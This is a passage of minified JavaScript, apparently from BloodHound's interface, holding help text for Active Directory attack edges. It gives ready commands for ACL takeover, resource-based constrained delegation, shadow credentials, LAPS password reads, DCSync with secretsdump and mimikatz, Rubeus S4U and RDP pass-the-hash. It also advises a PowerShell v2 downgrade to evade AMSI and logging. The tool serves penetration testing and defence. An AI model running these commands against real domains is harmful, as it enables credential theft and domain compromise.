",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return p(u,o?{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Retrieve LAPS Password "}),h(A,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}:{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" DCSync "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,"."]}),h(A,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),h(A,{variant:"body1",children:" Retrieve LAPS Passwords "}),p(A,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",e," enough privileges to retrieve LAPS passwords domain-wise."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body1",children:"Control of the Container"}),h(A,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),h(A,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),h(A,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),h(A,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"})]})},CanRDP:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the capability to create a Remote Desktop Connection with the computer ",r,"."]}),h(A,{variant:"body2",children:"Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."}),h(A,{variant:"body2",children:"Note: This edge does not guarantee privileged execution."})]}),abuse:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[h(A,{variant:"body2",children:"Abuse of this privilege will depend heavily on the type of access you have."}),h(A,{variant:"body1",children:"PlainText Credentials with Interactive Access"}),p(A,{variant:"body2",children:["With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer ",r,". When prompted for credentials, input the credentials for"," ","Group"===t?`a member of ${e}`:`${e}`," to initiate the remote desktop connection."]}),h(A,{variant:"body1",children:"Password Hash with Interactive Access"}),h(A,{variant:"body2",children:"With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode."}),h(A,{variant:"body2",children:"First, inject the NTLM credential for the user you're abusing into memory using mimikatz:"}),h(A,{component:"pre",children:'lsadump::pth /user:dfm /domain:testlab.local /ntlm:&lt;ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"'}),p(A,{variant:"body2",children:["This will open a new RDP window. Input the computer ",r," to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail."]}),h(A,{variant:"body1",children:"Plaintext Credentials without Interactive Access"}),h(A,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),h(A,{component:"pre",children:"(proxychains) xfreerdp /u:dfm /d:testlab.local /v:<computer ip>"}),h(A,{variant:"body2",children:"xfreerdp will prompt you for a password, and then initiate the remote desktop connection."}),h(A,{variant:"body1",children:"Password Hash without Interactive Access"}),h(A,{variant:"body2",children:"This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:"}),h(A,{component:"pre",children:"(proxychains) xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>"}),h(A,{variant:"body2",children:"This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),h(A,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/",children:"https://michael-eder.net/post/2018/native_rdp_pass_the_hash/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/",children:"https://www.kali.org/penetration-testing/passing-hash-remote-desktop/"})]})},ExecuteDCOM:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," membership in the Distributed COM Users local group on the computer ",r,"."]}),h(A,{variant:"body2",children:"This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods."})]}),abuse:({targetName:e})=>p(u,{children:[h(A,{variant:"body2",children:"The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile)."}),h(A,{variant:"body2",children:"One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:"}),h(A,{component:"pre",children:`$ComputerName = ${e}  # Remote computer\n$clsid = "{fbae34e8-bf95-4da8-bf98-6c6e580aa348}"      # GUID of the COM object\n$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)\n$ComObject = [Activator]::CreateInstance($Type)`}),h(A,{variant:"body2",children:"If specifying a COM object by its ProgID:"}),h(A,{component:"pre",children:`$ComputerName = ${e}  # Remote computer\n$ProgId = "<NAME>"      # GUID of the COM object\n$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)\n$ComObject = [Activator]::CreateInstance($Type)`})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"The artifacts generated when using DCOM vary depending on the specific COM object used."}),h(A,{variant:"body2",children:"DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must be authenticated. Consequently, logon events and authentication-specific logs(Kerberos, NTLM, etc.) will be generated when using DCOM."}),h(A,{variant:"body2",children:"Processes may be spawned as the user authenticating to the remote system, as a user already logged into the system, or may take advantage of an already spawned process."}),p(A,{variant:"body2",children:['Many DCOM servers spawn under the process "svchost.exe -k DcomLaunch" and typically have a command line containing the string " -Embedding" or are executing inside of the DLL hosting process "DllHost.exe /Processid:',"{<AppId>}",'" (where AppId is the AppId the COM object is registered to use). Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.']})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",children:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",children:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",children:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",children:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom ",children:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques",children:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/",children:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1175",children:"https://attack.mitre.org/wiki/Technique/T1175"}),h(A,{variant:"body1",children:"Invoke-DCOM"}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1",children:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1"}),h(A,{variant:"body1",children:"LethalHTA"}),h(S,{target:"_blank",rel:"noopener",href:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html",children:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/codewhitesec/LethalHTA/ ",children:"https://github.com/codewhitesec/LethalHTA/"})]})},AllowedToDelegate:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:["The ",Cr(t)," ",e," has the constrained delegation privilege to the computer"," ",r,"."]}),h(A,{variant:"body2",children:'The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.'}),h(A,{variant:"body2",children:'An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.'})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse."}),h(A,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),h(A,{component:"pre",children:'Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt'})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:'In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.'}),h(A,{component:"pre",children:"getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'"})]}),opsec:()=>h(A,{variant:"body2",children:"As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/",children:"https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/",children:"https://blog.harmj0y.net/activedirectory/s4u2pwnage/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://twitter.com/gentilkiwi/status/806643377278173185",children:"https://twitter.com/gentilkiwi/status/806643377278173185"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more",children:"https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/",children:"https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"})]})},GetChanges:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the DS-Replication-Get-Changes privilege on the domain"," ",r,"."]}),h(A,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack."})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),opsec:()=>h(A,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]})},GetChangesAll:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the DS-Replication-Get-Changes-All privilege on the domain"," ",r,"."]}),h(A,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack."})]}),windowsAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),linuxAbuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),h(A,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),opsec:()=>h(A,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]})},ReadLAPSPassword:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer ",r,"."]}),h(A,{variant:"body2",children:'The local administrator password for a computer managed by LAPS is stored in the confidential 